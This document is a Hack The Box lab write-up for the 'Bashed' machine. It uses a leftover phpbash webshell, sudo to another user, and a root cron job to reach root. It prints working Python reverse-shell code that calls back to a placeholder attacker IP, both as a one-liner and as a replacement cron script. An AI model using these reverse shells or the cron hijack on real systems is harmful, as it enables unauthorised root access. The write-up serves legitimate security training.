---
title: HTB — Bashed
type: lab-writeup
platform: HTB
difficulty: foundational
os: Linux
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - HTB
  - linux
  - web
  - webshell
  - phpbash
  - sudo
  - cron
  - python
  - gobuster
---

# HTB — Bashed

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Bashed |
| Difficulty | Easy |
| OS | Ubuntu 16.04 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-27 |

> **Summary:** phpbash webshell is left on the server in a dev directory. Sudo as a secondary user grants a pivot. Cron job running as root executes scripts from a user-writable directory — write a Python reverse shell for root.

---

## Objectives

- [x] Recon: discover phpbash webshell via directory busting
- [x] Exploit: use existing webshell for foothold, pivot to real reverse shell
- [x] Escalate: sudo to scriptmanager → abuse root cron job
- [x] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/bashed_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80/tcp | http | Apache httpd 2.4.18 |

Only port 80 — pure web challenge.

### Web enumeration

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/big.txt -x php
```

**Key findings:**

| Path | Contents |
|---|---|
| `/dev/` | Directory listing — contains `phpbash.php` and `phpbash.min.php` |
| `/uploads/` | Empty upload directory |
| `/php/` | PHP info files |

---

## Vulnerability Background

**phpbash** — a standalone PHP interactive web shell (GitHub project by Arrexel). If left on a production server, it provides unauthenticated command execution in the browser.

| Field | Detail |
|---|---|
| Weakness | CWE-553: Command Shell in Externally Accessible Directory |
| Impact | Full RCE as web server user |
| Fix | Remove development tools from production; restrict directory listing |

---

## Foothold

### Use the phpbash webshell

Navigate to `http://<IP>/dev/phpbash.php` — interactive bash shell in browser as `www-data`.

### Upgrade to a proper reverse shell

From phpbash, execute:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

```bash
# Listener
nc -lvnp 4444
```

**Result:** Reverse shell as `www-data`

---

## Privilege Escalation

### Step 1: sudo to scriptmanager

```bash
sudo -l
```

Output:
```
User www-data may run the following commands:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

```bash
sudo -u scriptmanager /bin/bash
```

**Result:** Shell as `scriptmanager`

### Step 2: Identify cron job

```bash
ls -la /scripts/
```

Contents:
```
-rw-r--r-- 1 scriptmanager scriptmanager  test.py
-rw-r--r-- 1 root          root           test.txt
```

`test.py` is owned by `scriptmanager` — `test.txt` is owned by root and has a recent timestamp. A cron job runs Python scripts in `/scripts/` as root.

### Step 3: Replace script with reverse shell

```bash
cat > /scripts/test.py << 'EOF'
import socket,subprocess,os
s=socket.socket()
s.connect(("<YOUR_IP>",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
```

```bash
# Listener
nc -lvnp 5555
```

Wait ~1 minute for cron to execute.

**Result:** Root shell.

---

## Flags

| Flag | Location |
|---|---|
| User | `/home/arrexel/user.txt` |
| Root | `/root/root.txt` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Development tools on production servers are an instant critical finding — phpbash, adminer, phpinfo, debug consoles
- Directory listing enabled + leftover webshell = zero-effort foothold
- `sudo -l` showed access to run commands as another user (not root) — lateral movement before vertical escalation
- Cron jobs running scripts from user-writable directories are a classic privesc — check file ownership and timestamps
- Two-step privilege escalation (www-data → scriptmanager → root) is realistic and common in real engagements

---

## Tools Used

- Nmap
- Gobuster
- Netcat
- Python-for-Security

---

## References

- [Hack The Box — Bashed](https://app.hackthebox.com/machines/Bashed)
- [phpbash — GitHub](https://github.com/Arrexel/phpbash)
- [GTFOBins — Cron](https://gtfobins.github.io/)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Linux-Privilege-Escalation
- Web-Application-Testing
- Gobuster
- Reverse-Shell-Cheatsheet
- Python-for-Security

---
<- [[Labs-MOC]]